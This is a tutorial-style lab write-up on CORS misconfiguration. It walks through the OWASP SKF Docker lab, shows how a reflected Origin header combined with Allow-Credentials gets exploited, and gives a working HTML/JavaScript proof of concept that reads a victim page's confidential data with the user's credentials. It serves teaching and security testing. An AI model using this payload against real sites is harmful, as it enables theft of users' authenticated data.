**Cross-Origin Resource Sharing (CORS)** is a mechanism that allows a web server to *restrict access to resources from different origins*, i.e. different domains or protocols. CORS is used to protect users' privacy and security by preventing other websites from accessing sensitive information without permission.

Suppose we have a web application on the domain "*example.com*" that uses a web API on the domain "*api.example.com*" to retrieve data. If the web application is properly configured for CORS, it will only allow cross-origin requests from the "*example.com*" domain to the API on the "*api.example.com*" domain. If a request is made from a different domain, such as "*attacker.com*", the request will be blocked by the web browser.

However, if the web application is not properly configured for CORS, an attacker could exploit this weakness to access sensitive resources and data. For example, if the web application does not validate the user's authorization to access resources, an attacker could inject malicious code into a web page to make requests to the application's API in the "*api.example.com*" domain.

The attacker could use automated tools to test different CORS header values and find a misconfiguration that allows the request from another domain. If the attacker is successful, he could access sensitive resources and data that should not be available from your website. For example, he could retrieve user login information, modify application data, etc.

To prevent this type of attack, it is important to properly configure CORS in the web application and ensure that only cross-origin requests from trusted domains are allowed.

# Example

For the realization of the example we must download and execute the following resource:

```
docker pull blabla1337/owasp-skf-lab:cors
docker run -it -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:cors
```

Once the lab is configured we can enter *localhost* on port *5000* and log in with *admin*:*admin*.

If we refresh the page and send the request to **BurpSuite** we will see these two headers in the response:

```bash
# This is so that requests can be made from behind where session cookies and others are transported
Access-Control-Allow-Credentials: true

# Everyone can upload resources from this website
Access-Control-Allow-Origin: *
```

The idea with *Access-Control-Allow-Origin* is that only the sites from which we want to load the resources are allowed, otherwise anyone can load them.

If we put an *Origin* header in our request, we could in this case define our own web site in *Access-Control-Allow-Origin* and thus load all the content of this web site in our malicious web site:

```bash
# Request header
Origin: https://test.com

# Response header
Access-Control-Allow-Origin: https://test.com
```

In this case, *\https://test.com* has the possibility to load a resource from the victim page to bring it to you and dump it on our website.

To test cloning all the web content we can run our own web site on a local *Python* server on port *80* with the following *HTML* file:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET', 'http://localhost:5000/confidential', true);
    req.withCredentials= true;
    req.send();

    function reqListener() {
        document.getElementById("stoleInfo").innerHTML = req.responseText;
    }
</script>

<br>
<center><h1>You have been pwned, this is your website information:</h1></center>

<p id="stoleInfo"></p>
```

We can see that we have indeed been able to steal the resources of the victim website and dump them on our own website.